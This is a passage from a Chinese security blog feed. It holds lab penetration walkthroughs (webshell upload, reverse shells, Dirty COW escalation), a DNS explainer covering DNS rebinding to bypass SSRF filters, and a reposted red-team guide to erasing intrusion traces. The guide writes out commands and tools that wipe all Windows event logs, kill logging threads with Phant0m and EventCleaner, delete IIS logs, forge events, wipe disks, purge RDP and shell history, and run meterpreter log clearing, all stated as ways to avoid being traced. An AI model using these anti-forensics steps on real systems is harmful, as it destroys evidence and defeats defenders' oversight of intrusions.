Unavailable</span><br><span class="line">Server timezone: UTC</span><br><span class="line">Server local time: 2023-03-07 14:40:29</span><br><span class="line">Daylight Saving Time enabled?: 0</span><br><span class="line">Automatically adjust Daylight Saving Time setting?: 1</span><br><span class="line">Time zone (GMT offset in seconds): Asia/Baghdad (10800)</span><br><span class="line">MySQL: 5.5.47-0+deb7u1 ((Debian)) </span><br><span class="line">Database server time: 2023-03-07 08:40:29</span><br><span class="line">Database server time offset: 0 s</span><br><span class="line">Database server timezone: SYSTEM</span><br><span class="line">Database session timezone: SYSTEM</span><br><span class="line">Locale: C</span><br><span class="line">Site / Admin language: en / en</span><br><span class="line">Web server: Apache/2.2.22 (Debian)</span><br><span class="line">Apache version: Apache/2.2.22 (Debian)</span><br><span class="line">PHP server API: apache2handler</span><br><span class="line">RFC 2616 headers: </span><br><span class="line">Server OS: Linux 3.2.0-4-amd64</span><br><span class="line">Admin-side theme: hive 4.8.3</span><br><span class="line"></span><br><span class="line">Pre-flight check: </span><br><span class="line">------------------------</span><br><span class="line"></span><br><span class="line">New Textpattern version 4.8.8 available for download. Help</span><br><span class="line"></span><br><span class="line">DNS lookup failed: 192.168.2.35 Help</span><br><span class="line"></span><br><span class="line">/var/www/textpattern/textpattern/setup/ still exists. Help</span><br><span class="line"></span><br><span class="line">Site URL preference might be incorrect: 192.168.174.159/textpattern Help</span><br><span class="line"></span><br><span class="line">Image directory is not writable: /var/www/textpattern/images</span><br><span class="line">Theme directory is not writable: /var/www/textpattern/themes</span><br><span class="line">Plugin directory is not writable: /var/www/textpattern/textpattern/plugins Help</span><br><span class="line">------------------------</span><br><span class="line"></span><br><span class="line">.htaccess file contents: </span><br><span class="line">------------------------</span><br><span class="line"># BEGIN Textpattern</span><br><span class="line"></span><br><span class="line">#DirectoryIndex index.php index.html</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">    RewriteEngine On</span><br><span class="line"></span><br><span class="line">    # Enable the `FollowSymLinks` option below if it isn&#x27;t already.</span><br><span class="line">    #Options +FollowSymlinks</span><br><span class="line"></span><br><span class="line">    #RewriteBase /relative/web/path/</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; -f [OR]</span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; -d</span><br><span class="line">    RewriteRule ^(.+) - [PT,L]</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_URI&#125; !=/favicon.ico</span><br><span class="line">    RewriteRule ^(.*) index.php</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;HTTP:Authorization&#125;  !^$</span><br><span class="line">    RewriteRule .* - [E=REMOTE_USER:%&#123;HTTP:Authorization&#125;]</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_mime.c&gt;</span><br><span class="line">    AddType image/svg+xml  svg svgz</span><br><span class="line">    AddEncoding gzip       svgz</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line"># For additional Apache-compatible web server configuration settings to enhance</span><br><span class="line"># site performance and security, we recommend:</span><br><span class="line"># https://github.com/h5bp/server-configs-apache/blob/master/dist/.htaccess</span><br><span class="line"></span><br><span class="line"># END Textpattern</span><br><span class="line"></span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure></li><li><p>文件上传</p><p>可以直接上传🐎，无任何防护</p><p>漏洞分析：<a href="https://blog.csdn.net/yun2diao/article/details/92765372">https://blog.csdn.net/yun2diao/article/details/92765372</a></p><p>反弹shell</p><img src="../../../typora img/image-20230307151417930.png" alt="image-20230307151417930" style="zoom:80%;" /></li></ul><p>提权</p><p>上传linepeas.sh查找可提权项</p><p>这里查找CVE</p><p><img src="/../images/image-20230307153044644-1686283466997.png" alt="image-20230307153044644"></p><p>选择一个cve进行提权，我这里选择的是脏牛提权<a href="https://github.com/firefart/dirtycow">https://github.com/firefart/dirtycow</a></p><p><img src="/../images/image-20230307154757476-1686283466997.png" alt="image-20230307154757476"></p><p><img src="/../images/image-20230307154831929-1686283466997.png" alt="image-20230307154831929"></p><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p><img src="/../images/image-20230307182708576-1686283466997.png" alt="image-20230307182708576"></p><p><img src="/../images/image-20230307182726635-1686283466997.png" alt="image-20230307182726635"></p><p>开放了很多端口和服务，不同端口上都有网站，所以目录扫描时需要注意扫哪个端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">66</span><br><span class="line">80</span><br><span class="line">8086</span><br></pre></td></tr></table></figure><ul><li><p>80端口</p><p><img src="/../images/image-20230307224547682-1686283466997.png" alt="image-20230307224547682"></p><p>msf一条龙</p></li></ul><p><img src="/../images/image-20230307224427084-1686283466997.png" alt="image-20230307224427084"></p><p><img src="/../images/image-20230307224412649-1686283466997.png" alt="image-20230307224412649"></p><ul><li><p>66端口</p><p>dirsearch扫描结果</p><p><img src="/../images/image-20230307224912102-1686283466997.png" alt="image-20230307224912102"></p><p><img src="/../images/image-20230307224854194-1686283466998.png" alt="image-20230307224854194"></p><p>​历史命令操作.bash_history重要部分</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget 192.168.2.43:81/root.txt</span><br><span class="line">mv root.txt flag.txt</span><br><span class="line">nano flag.txt</span><br></pre></td></tr></table></figure><p>可以发现从别的主机上复制了flag，并重名为flag.txt</p></li><li><p>8086</p><p><img src="/../images/image-20230307225845372-1686283466998.png" alt="image-20230307225845372"></p><p>都是静态页面</p></li></ul><p>这里看了wp正常是从66端口目录扫描出&#x2F;eno目录，下载并破解zip压缩包，获得80端口的用户凭证的。。</p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>不知道为什么没有8</p><p><img src="/../images/image-20230307232027664-1686283466998.png" alt="image-20230307232027664"></p><p>网站</p><p>只有一个登录框</p><p>sql注入失败，弱口令爆破失败</p><p>目录扫描</p><p><img src="/../images/image-20230307234601067-1686283466998.png" alt="image-20230307234601067"></p><p>看到backup还以为有备份文件可以进行代码审计，但是没有；</p><p>访问&#x2F;admin&#x2F;home.php尝试是否存在未授权，发现没有。</p><p>寻找网站框架漏洞 </p><p><img src="/../images/image-20230307234835760-1686283466999.png" alt="image-20230307234835760"></p><p>尝试了之后发现只存在rce漏洞</p><p><img src="/../images/image-20230307233410737-1686283466999.png" alt="image-20230307233410737"></p><p><img src="/../images/image-20230307233603248-1686283466999.png" alt="image-20230307233603248"></p><p><img src="/../images/image-20230307233643324-1686283466999.png" alt="image-20230307233643324"></p><p>使用第二个py脚本</p><p><img src="/../images/image-20230308001806203-1686283466999.png" alt="image-20230308001806203"></p><p><img src="/../images/image-20230308001820794-1686283466999.png" alt="image-20230308001820794"></p><p>这个脚本很贴心地给出了服务器信息，并读取了配置文件，获得了clapton用户的凭证。</p><p><img src="/../images/image-20230307234930848-1686283467000.png" alt="image-20230307234930848"></p><p>发现大部分命令明明可以使用的却都执行不了，所以需要反弹shell到kali，经测试可以使用nc进行反弹shell</p><p><img src="/../images/image-20230308130950848-1686283467000.png" alt="image-20230308130950848"></p><p>使用python切换为交互式shell，切换到clapton用户</p><p><img src="/../images/image-20230308131017546-1686283467000.png" alt="image-20230308131017546"></p><p>发现clapton家目录下有note.txt</p><p><img src="/../images/image-20230308131125354-1686283467000.png" alt="image-20230308131125354"></p><p>读取</p><p><img src="/../images/image-20230308131243068-1686283467000.png" alt="image-20230308131243068"></p><p>提示我们用缓冲区溢出漏洞提权，这部分pwn不会</p><p>按照下面文章中的方法进行复现</p><p><a href="https://zhuanlan.zhihu.com/p/570218595">https://zhuanlan.zhihu.com/p/570218595</a></p><p>最后贴上复现成功的截图</p><p><img src="/../images/image-20230308130938122-1686283467000.png" alt="image-20230308130938122"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DNS协议</title>
      <link href="/2023/06/01/DNS%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/06/01/DNS%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="DNS协议介绍"><a href="#DNS协议介绍" class="headerlink" title="DNS协议介绍"></a>DNS协议介绍</h1><p>DNS（Domain Name System）协议位于ISO参考模型的应用层。在ISO参考模型中，应用层是最高层，负责提供网络服务和应用程序之间的接口。</p><p>DNS协议的主要功能是将域名解析为IP地址。当用户在浏览器中输入一个域名时，例如”<a href="http://example.com/">example.com</a>“，浏览器会发送一个DNS查询请求到本地DNS服务器。本地DNS服务器通过DNS协议向上级DNS服务器发出请求，逐级查询，直至找到与域名对应的IP地址，并返回给用户的设备。这样，用户可以通过域名来访问互联网上的资源，而不需要记住复杂的IP地址。</p><p>DNS协议支持UDP和TCP，端口号为53</p><h1 id="域名分类"><a href="#域名分类" class="headerlink" title="域名分类"></a>域名分类</h1><p><img src="/../images/image-20221115163957139-1694328360129.png" alt="image-20221115163957139"></p><h1 id="DNS-TTL"><a href="#DNS-TTL" class="headerlink" title="DNS TTL"></a>DNS TTL</h1><p>TTL值全称是“生存时间（Time To Live)”，简单的说它表示DNS记录在DNS服务器上缓存时间，数值越小，修改记录各地生效时间越快。<br>当各地的DNS(LDNS)服务器接受到解析请求时，就会向域名指定的授权DNS服务器发出解析请求从而获得解析记录；该解析记录会在DNS(LDNS)服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS服务器将不再向授权DNS服务器发出请求，而是直接返回刚才获得的记录；而这个记录在DNS服务器上保留的时间，就是TTL值。</p><p>常见的设置TTL值的场景：<br>• 增大TTL值，以节约域名解析时间<br>• 减小TTL值，减少更新域名记录时的不可访问时间</p><h1 id="浏览器DNS解析流程"><a href="#浏览器DNS解析流程" class="headerlink" title="浏览器DNS解析流程"></a>浏览器DNS解析流程</h1><p>因为每次请求时都向DNS服务器发起查询，过于浪费资源，所以出现了DNS缓存。</p><p><strong>浏览器DNS查找顺序一般是这样的:</strong> </p><p>   浏览器DNS缓存-&gt;本地系统DNS缓存-&gt;本地计算机HOSTS文件-&gt;路由器DNS缓存-&gt;ISP的DNS缓存-&gt;根服务器递归搜索</p><ul><li><p>浏览器DNS缓存（内存中)</p><p>浏览器会按照一定频率缓存DNS记录  <a href="https://www.jianshu.com/p/9e7aa4ec4b46">查看google浏览器DNS缓存</a></p></li><li><p>本地DNS缓存(内存中)</p><p>查看：<code>ipconfig /displaydns</code></p><p>清除：<code>ipconfig /flushdns</code></p></li><li><p>本地HOSTS文件</p><p><code>c:\windows\system32\drivers\etc\hosts </code> </p></li><li><p>路由器DNS缓存</p><blockquote><p>路由器DNS被篡改会造成域名劫持，你访问的网址都会被定位到同一个位置，但是IP直接可以访问</p></blockquote></li><li><p>ISP的DNS服务器</p><ul><li><p>公共服务器</p><p><code>8.8.8.8</code> (Google 提供)</p><p><code>114.114.114.114</code> (国内公共 DNS)</p></li><li><p>专用服务器</p></li></ul></li><li><p>根服务器</p><blockquote><p>以访问<a href="http://www.baidu.com为例,/">www.baidu.com为例，</a> DNS服务器先问根域名服务器.com域名服务器的IP地址，然后再问.com域名服务器，以此类推</p></blockquote></li></ul><p><img src="/../images/image-20221115164624383-1694328362681.png" alt="image-20221115164624383"></p><h1 id="设置DNS解析"><a href="#设置DNS解析" class="headerlink" title="设置DNS解析"></a>设置DNS解析</h1><p>以阿里云服务器为例</p><p><img src="/../images/image-20221004160123895-1694328366241.png" alt="image-20221004160123895"></p><ul><li><p>主机记录</p><p>就是要解析的域名，比如网站根域名为khaz.top，主机记录@即@khaz.top等价于khaz.top</p><blockquote><p>通常会将加www和不加www的域名都解析到同一个ip上。</p></blockquote></li><li><p>记录类型</p><p><img src="/../images/image-20221004160443733-1694328407151.png" alt="image-20221004160123896"></p></li><li><p>解析线路</p><p>就是选择哪一个ISP的DNS服务器。</p></li><li><p>记录值</p><p>就是域名对应的IP地址。</p></li><li><p>TTL</p><p>DNS缓存时间，当修改DNS解析时，需要经过TTL时间才会生效。</p></li></ul><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h4 id="当多个域名解析到一个IP时，如果通过IP地址来访问服务器，那么会访问到哪一个域名（网站）呢？"><a href="#当多个域名解析到一个IP时，如果通过IP地址来访问服务器，那么会访问到哪一个域名（网站）呢？" class="headerlink" title="当多个域名解析到一个IP时，如果通过IP地址来访问服务器，那么会访问到哪一个域名（网站）呢？"></a>当多个域名解析到一个IP时，如果通过IP地址来访问服务器，那么会访问到哪一个域名（网站）呢？</h4><p>答案：</p><ol><li><p>虚拟主机技术</p><p>实现多个站点在同一台服务器上。</p><blockquote><p>比如服务器使用Apache，那么在Apache的配置文件中加入VirtualHost即可新增虚拟主机</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:<span class="number">80</span>&gt;</span><br><span class="line"> DocumentRoot /<span class="keyword">var</span>/www/acm</span><br><span class="line"> ServerName acm.hdu.edu.cn</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">    </span><br><span class="line">&lt;VirtualHost *:<span class="number">80</span>&gt;</span><br><span class="line"> DocumentRoot /<span class="keyword">var</span>/www/html</span><br><span class="line"> ServerName www.hdu.edu.cn</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><p>ServerName对应请求头的HOST字段，DocumentRoot对应的站点目录</p><p>这样HOST为acm.hdu.edu.cn时，访问的就是&#x2F;var&#x2F;www&#x2F;acm下的acm.hdu.edu.cn网站</p><p>HOST为<a href="http://www.hdu.edu.cn时,访问的就是/var/www/html%E4%B8%8B%E7%9A%84www.hdu.edu.cn%E7%BD%91%E7%AB%99">www.hdu.edu.cn时，访问的就是/var/www/html下的www.hdu.edu.cn网站</a></p><blockquote><p>虚拟主机技术，也可以实现不同端口对应不同站点，只要修改上面的&lt;VirtualHost *:80&gt;即可。</p></blockquote></li><li><p>反向代理技术</p><p>每个站点都在不同的主机上，但都是通过E这个代理服务器进行访问的。</p><p><img src="/../images/reverse-proxy-flow-1694328428983.svg" alt="反向代理流"></p></li></ol><h1 id="安全相关"><a href="#安全相关" class="headerlink" title="安全相关"></a>安全相关</h1><h2 id="DNS欺骗攻击"><a href="#DNS欺骗攻击" class="headerlink" title="DNS欺骗攻击"></a>DNS欺骗攻击</h2><p>DNS欺骗攻击（DNS spoofing attack）是一种网络攻击方式，攻击者通过篡改或伪造域名系统（DNS）的解析结果，将用户的请求重定向到恶意网站或进行信息窃取等恶意行为。这种攻击方式可能导致用户被引导到虚假的网站，从而遭受钓鱼诈骗、恶意软件下载、个人信息泄露等风险。</p><h2 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS  Rebinding"></a>DNS  Rebinding</h2><p><strong>有漏洞的SSRF过滤器执行步骤如下</strong></p><ol><li>获取输入的URL，从该URL中提取HOST，如果提取出来的是IP，那么直接跳到第三步；</li><li>对该HOST进行DNS解析，获取到解析的IP；</li><li>检测该IP是否是合法的，比如是否是私有IP等（是就直接终止流程）；</li><li>如果IP检测为合法的，则进入CURL发包；</li></ol><p><strong>漏洞点</strong><br>DNS解析一共分两次，其中第一次是至关重要的有效性检测，第二次则是具体发起的请求。我们利用DNS Rebinding技术，在<strong>第一次校验IP</strong>的时候<strong>返回一个合法的IP</strong>，在<strong>真实发起请求</strong>的时候，返回我们<strong>真正想要访问的内网IP</strong>即可。</p><p><strong>实现方式</strong></p><ul><li>同一个域名绑定两条TTL都是0的A记录，不过这样DNS解析是随机的，不够稳定</li><li>通过自建DNS服务器，稳定控制解析返回结果</li></ul><h2 id="DNS-Log"><a href="#DNS-Log" class="headerlink" title="DNS Log"></a>DNS Log</h2><p>ns记录指向自建的DNS服务器，然后当目标主机发起DNS Query时，自建的DNS服务器就记录下该请求。从下图中可以看到向NS服务器发起DNS请求的为用户设置的DNS服务器，这也是为什么查看DNSLog记录的IP不是目标主机的原因。</p><p><img src="/../images/20210615113242-57d33758-cd8a-1.png" alt="20210615113242-57d33758-cd8a-1"></p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><p>nslookup&#x2F;dig</p><p><a href="https://blog.csdn.net/weixin_42426841/article/details/115364502">https://blog.csdn.net/weixin_42426841/article/details/115364502</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>入侵痕迹清理</title>
      <link href="/2023/06/01/%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/"/>
      <url>/2023/06/01/%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>转载自<a href="https://www.cnblogs.com/yokan/p/15701536.html">https://www.cnblogs.com/yokan/p/15701536.html</a></p></blockquote><p>在攻击结束后，如何不留痕迹的清除日志和操作记录，以掩盖入侵踪迹，这其实是一个细致的技术活。在蓝队的溯源中，攻击者的攻击路径都将记录在日志中，所遗留的工具也会被蓝队进行分析，在工具中可以查找特征，红队自研工具更容易留下蛛丝马迹。你所做的每一个操作，都要被抹掉；你所上传的工具，都应该被安全地删掉，以防被溯源在演练中失分。</p><h2 id="Windows入侵痕迹清理"><a href="#Windows入侵痕迹清理" class="headerlink" title="Windows入侵痕迹清理"></a>Windows入侵痕迹清理</h2><h3 id="Windows日志清除"><a href="#Windows日志清除" class="headerlink" title="Windows日志清除"></a>Windows日志清除</h3><p>Windows日志路径：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">系统日志：<span class="variable">%SystemRoot%</span>\System32\Winevt\Logs\System.evtx</span><br><span class="line">安全日志：<span class="variable">%SystemRoot%</span>\System32\Winevt\Logs\Security.evtx</span><br><span class="line">应用程序日志：<span class="variable">%SystemRoot%</span>\System32\Winevt\Logs\Application.evtx</span><br><span class="line"></span><br><span class="line">日志在注册表的键：HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog</span><br></pre></td></tr></table></figure><p>常见的安全事件ID：</p><p><img src="/../images/1964477-20211217110446774-1876570839.png" alt="img"></p><p>windows 日志清除方式：</p><h4 id="（1）最简单粗暴的方式"><a href="#（1）最简单粗暴的方式" class="headerlink" title="（1）最简单粗暴的方式"></a><strong>（1）最简单粗暴的方式</strong></h4><p>开始→运行,输入 <code>eventvwr</code> 进入事件查看器，右边栏选择清除日志。</p><p><img src="/../images/1964477-20211217110511425-1770500557.png" alt="img"></p><p>或者使用wevtutil</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">wevtutil el             列出系统中所有日志名称</span><br><span class="line"><span class="keyword">for</span> /F &quot;tokens=*&quot; %a <span class="keyword">in</span> (&#x27;wevtutil.exe el&#x27;) <span class="keyword">DO</span> wevtutil.exe cl &quot;%a&quot;  清除所有日志</span><br><span class="line">wevtutil cl system      清理系统日志</span><br><span class="line">wevtutil cl application 清理应用程序日志</span><br><span class="line">wevtutil cl security    清理安全日志</span><br></pre></td></tr></table></figure><h4 id="（2）powershell一键清除Windows事件日志"><a href="#（2）powershell一键清除Windows事件日志" class="headerlink" title="（2）powershell一键清除Windows事件日志"></a><strong>（2）powershell一键清除Windows事件日志</strong></h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PowerShell <span class="literal">-Command</span> <span class="string">&quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security&#125;&quot;</span></span><br><span class="line">或</span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-ListLog</span> Application,Setup,Security <span class="literal">-Force</span> | % &#123;Wevtutil.exe cl <span class="variable">$_</span>.Logname&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/1964477-20211217110613512-722438660.png" alt="img"></p><h4 id="⭐（3）利用脚本停止日志的记录"><a href="#⭐（3）利用脚本停止日志的记录" class="headerlink" title="⭐（3）利用脚本停止日志的记录"></a>⭐<strong>（3）利用脚本停止日志的记录</strong></h4><p>通过该脚本遍历事件日志服务进程（专用svchost.exe）的线程堆栈，并标识事件日志线程以杀死事件日志服务线程。</p><p>该脚本没有杀死进程，而是杀死了线程。因此，虽然事件日志服务似乎在系统中运行（因为没有终止进程），但它实际上并没有运行（因为终止了线程）并且系统不收集日志。</p><p>项目地址：<a href="https://github.com/hlldz/Phant0m">hlldz&#x2F;Phant0m: Windows Event Log Killer (github.com)</a></p><p>使用：<br><img src="/../images/1964477-20211217110647934-387654697.png" alt="img"></p><p>执行phant0m之后，尝试远程登录该服务器，并不会记录日志<br><img src="/../images/1964477-20211217110702635-406062829.png" alt="img"></p><h4 id="⭐（4）Windows单条日志清除"><a href="#⭐（4）Windows单条日志清除" class="headerlink" title="⭐（4）Windows单条日志清除"></a>⭐<strong>（4）Windows单条日志清除</strong></h4><p>项目地址：<a href="https://github.com/QAX-A-Team/EventCleaner">QAX-A-Team&#x2F;EventCleaner: A tool mainly to erase specified records from Windows event logs, with additional functionalities. (github.com)</a></p><p>该工具主要用于从Windows事件日志中删除指定的记录。同时也可以暂停日志线程,停止日志记录。</p><p>使用步骤：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、EventCleaner closehandle   <span class="comment">#解除 security.evtx的文件占坑</span></span><br><span class="line">2、EventCleaner 100           <span class="comment">#删除 event record id 为 100 的日志</span></span><br><span class="line">3、EventCleaner <span class="built_in">suspend</span>       <span class="comment">#暂停日志线程,停止日志记录</span></span><br><span class="line">4、<span class="keyword">do</span> anything without worrying about logs</span><br><span class="line">5、EventCleaner normal        <span class="comment">#恢复日志线程</span></span><br><span class="line">6、delete EventCleaner        </span><br></pre></td></tr></table></figure><p><img src="/../images/1964477-20211217110742380-709580735.png" alt="img"><br><img src="/../images/1964477-20211217110753850-106850006.png" alt="img"></p><h4 id="（5）Windows日志伪造"><a href="#（5）Windows日志伪造" class="headerlink" title="（5）Windows日志伪造"></a><strong>（5）Windows日志伪造</strong></h4><p>使用eventcreate这个命令行工具来伪造日志或者使用自定义的大量垃圾信息覆盖现有日志。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">eventcreate -l system -so administrator -t warning -d <span class="string">&quot;this is a test&quot;</span> -<span class="built_in">id</span> 500</span><br></pre></td></tr></table></figure><h3 id="IIS日志"><a href="#IIS日志" class="headerlink" title="IIS日志"></a><strong>IIS日志</strong></h3><p>IIS默认日志路径：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">SystemDrive%\inetpub\logs\LogFiles\W3SVC1\</span></span><br></pre></td></tr></table></figure><p><img src="/../images/1964477-20211217110825916-1141769327.png" alt="img"></p><p>清除WWW日志：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">停止服务：<span class="built_in">net</span> stop w3svc</span><br><span class="line">删除日志目录下所有文件：<span class="built_in">del</span> *.*</span><br><span class="line">启用服务：<span class="built_in">net</span> <span class="built_in">start</span> w3svc</span><br></pre></td></tr></table></figure><h3 id="利用Windows自带命令进行安全擦除"><a href="#利用Windows自带命令进行安全擦除" class="headerlink" title="利用Windows自带命令进行安全擦除"></a><strong>利用Windows自带命令进行安全擦除</strong></h3><h4 id="（1）Shift-Delete快捷键永久删除"><a href="#（1）Shift-Delete快捷键永久删除" class="headerlink" title="（1）Shift+Delete快捷键永久删除"></a>（1）Shift+Delete快捷键永久删除</h4><p>直接删除文件，还是能在回收站找到的，使用Shift+Delete快捷键可以直接永久删除了。</p><p>可以用数据恢复软件，删除的文件尽快恢复，否则新的文件存入覆盖了原来的文件痕迹就很难恢复了。</p><h4 id="（2）Cipher-命令多次覆写"><a href="#（2）Cipher-命令多次覆写" class="headerlink" title="（2）Cipher 命令多次覆写"></a>（2）Cipher 命令多次覆写</h4><p>在删除文件后，可以利用Cipher 命令通过 &#x2F;W 参数可反复写入其他数据覆盖已删除文件的硬盘空间，彻底删除数据防止被恢复。</p><p>比如，删除<code>D:\tools</code>目录下的文件，然后执行这条命令：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cipher /w:D:\tools</span><br></pre></td></tr></table></figure><p>这样一来，D 盘上未使用空间就会被覆盖三次：一次 0x00、一次 0xFF，一次随机数，所有被删除的文件就都不可能被恢复了。</p><h4 id="（3）Format命令覆盖格式化"><a href="#（3）Format命令覆盖格式化" class="headerlink" title="（3）Format命令覆盖格式化"></a>（3）Format命令覆盖格式化</h4><p>Format 命令加上 &#x2F;P 参数后，就会把每个扇区先清零，再用随机数覆盖。而且可以覆盖多次。比如：</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">format</span> <span class="selector-tag">D</span>: /<span class="selector-tag">P</span>:<span class="number">8</span></span><br></pre></td></tr></table></figure><p>这条命令表示把 D 盘用随机数覆盖 8 次。</p><h3 id="清除远程桌面连接记录"><a href="#清除远程桌面连接记录" class="headerlink" title="清除远程桌面连接记录"></a>清除远程桌面连接记录</h3><p>当通过本机远程连接其他客户端或服务器后，会在本机存留远程桌面连接记录。代码保存为clear.bat文件，双击运行即可自动化清除远程桌面连接记录。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">reg delete <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot;</span> /va /f</span><br><span class="line">reg delete <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot;</span> /f</span><br><span class="line">reg add <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot;</span></span><br><span class="line"><span class="built_in">cd</span> %userprofile%\documents\</span><br><span class="line">attrib Default.rdp -s -h</span><br><span class="line">del Default.rdp</span><br></pre></td></tr></table></figure><h3 id="Metasploit-痕迹清除"><a href="#Metasploit-痕迹清除" class="headerlink" title="Metasploit 痕迹清除"></a><strong>Metasploit 痕迹清除</strong></h3><p>（1）查看事件日志</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run event_manager  -i   </span><br><span class="line">[*] Retriving Event Log Configuration</span><br><span class="line">Event Logs on System</span><br><span class="line">====================</span><br><span class="line"> Name                    Retention  Maximum Size  Records</span><br><span class="line"> ----                    ---------  ------------  -------</span><br><span class="line"> Application             Disabled   20971520K     2149</span><br><span class="line"> HardwareEvents          Disabled   20971520K     0</span><br><span class="line"> Internet Explorer       Disabled   K             0</span><br><span class="line"> Key Management Service  Disabled   20971520K     0</span><br><span class="line"> Security                Disabled   20971520K     1726</span><br><span class="line"> System                  Disabled   20971520K     3555</span><br><span class="line"> Windows PowerShell      Disabled   15728640K     138</span><br></pre></td></tr></table></figure><p>（2）清除事件日志（包括六种日志类型）</p><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">meterpreter <span class="operator">&gt;</span> run event_manager  <span class="operator">-</span><span class="built_in">c</span></span><br></pre></td></tr></table></figure><p>（3）另外，也可以输入clearv命令清除目标系统的事件日志（仅包含三种日志类型）</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; clearev </span><br><span class="line"><span class="selector-attr">[*]</span> Wiping <span class="number">4</span> records <span class="selector-tag">from</span> Application...</span><br><span class="line"><span class="selector-attr">[*]</span> Wiping <span class="number">8</span> records <span class="selector-tag">from</span> System...</span><br><span class="line"><span class="selector-attr">[*]</span> Wiping <span class="number">7</span> records <span class="selector-tag">from</span> Security...</span><br></pre></td></tr></table></figure><h3 id="清除recent"><a href="#清除recent" class="headerlink" title="清除recent"></a><strong>清除recent</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在文件资源管理器中点击“查看”-&gt;“选项”-&gt;在常规-&gt;隐私中点击”清除”按钮</span><br><span class="line">或直接打开C:\Users\Administrator\Recent并删除所有内容</span><br><span class="line">或在命令行中输入del /f /s /q “%userprofile%\Recent*.*</span><br></pre></td></tr></table></figure><h2 id="Linux入侵痕迹清理"><a href="#Linux入侵痕迹清理" class="headerlink" title="Linux入侵痕迹清理"></a>Linux入侵痕迹清理</h2><p>（ <strong>#管理员 $普通用户 &#x2F; 表示 根目录 ~表示当前用户家目录</strong>）</p><h3 id="清除history历史命令记录"><a href="#清除history历史命令记录" class="headerlink" title="清除history历史命令记录"></a><strong>清除history历史命令记录</strong></h3><p>查看历史操作命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">history</span></span><br></pre></td></tr></table></figure><p>history显示<strong>内存和~&#x2F;.bash_history中的所有内容</strong>；<br>内存中的内容并没有立刻写入~&#x2F;.bash_history，只有当当前shell关闭时才会将内存内容写入shell</p><p>（1）编辑history记录文件，删除部分不想被保存的历史命令。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.bash_history</span><br></pre></td></tr></table></figure><p>（2）清除当前用户的history命令记录⭐</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">history</span> -c  <span class="comment"># 删除内存中的所有命令历史</span></span><br><span class="line"><span class="built_in">history</span> -r  <span class="comment"># 删除当前会话历史记录</span></span><br></pre></td></tr></table></figure><p>（3）利用vim特性删除历史命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用vim打开一个文件vi test.txt<span class="comment"># 设置vim不记录命令，Vim会将命令历史记录，保存在viminfo文件中。:set history=0# 用vim的分屏功能打开命令记录文件.bash_history，编辑文件删除历史操作命令：vsp ~/.bash_history# 清楚保存.bash_history文件即可。</span></span></span><br></pre></td></tr></table></figure><p><img src="/../images/1964477-20211217110939435-1877634885.png" alt="img"></p><p>（4）在vim中执行自己不想让别人看到的命令</p><figure class="highlight bash"><table><tr><td 